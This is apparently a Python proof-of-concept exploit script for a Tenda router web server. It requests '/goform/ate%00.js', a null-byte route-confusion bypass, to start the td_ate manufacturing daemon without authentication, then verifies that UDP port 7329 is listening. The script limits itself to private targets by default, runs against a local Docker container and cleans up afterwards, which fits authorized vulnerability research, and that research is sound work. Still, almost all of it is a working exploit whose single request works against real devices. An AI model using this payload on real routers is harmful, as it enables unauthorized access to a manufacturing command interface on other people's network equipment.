#!/usr/bin/env python3
"""
PoC: unauthenticated route-confusion bypass starts td_ate manufacturing daemon.
"""

import argparse
import ipaddress
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


def require_private_target(base_url, allow_nonlocal):
    host = urllib.parse.urlparse(base_url).hostname
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def request(base_url, path):
    req = urllib.request.Request(base_url.rstrip("/") + path, method="GET")
    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=4) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as exc:
        return exc.code, dict(exc.headers), exc.read()
    except urllib.error.URLError as exc:
        return 0, {}, str(exc).encode()


def docker_sh(container, command):
    return subprocess.run(
        ["docker", "exec", container, "/bin/sh", "-c", command],
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    ).stdout


def cleanup_ate(container):
    docker_sh(container, "for p in $(ps | awk '/[t]d_ate/{print $1}'); do kill -9 \"$p\" 2>/dev/null || true; done")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://127.0.0.1:18080")
    parser.add_argument("--container", default="tenda-b104-native-httpd")
    parser.add_argument("--no-cleanup", action="store_true")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    require_private_target(args.target, args.allow_nonlocal)
    cleanup_ate(args.container)

    baseline_status, baseline_headers, _ = request(args.target, "/goform/ate")
    exploit_status, _, exploit_body = request(args.target, "/goform/ate%00.js")
    time.sleep(1)
    listeners = docker_sh(args.container, "ps; ss -lunp 2>/dev/null || netstat -lunp 2>/dev/null || true")
    vulnerable = "td_ate" in listeners and ":7329" in listeners

    print("[baseline] GET /goform/ate")
    print(f"  status={baseline_status} location={baseline_headers.get('Location', '')}")
    print("[exploit] GET /goform/ate%00.js")
    print(f"  status={exploit_status} body={exploit_body[:120]!r}")
    print("[validation] ATE UDP listener check")
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  evidence: td_ate is running and UDP/7329 is listening without authentication")
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N; exposes manufacturing command surface")
    else:
        print(listeners)

    if not args.no_cleanup:
        cleanup_ate(args.container)
        print("[cleanup] killed spawned td_ate")

    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
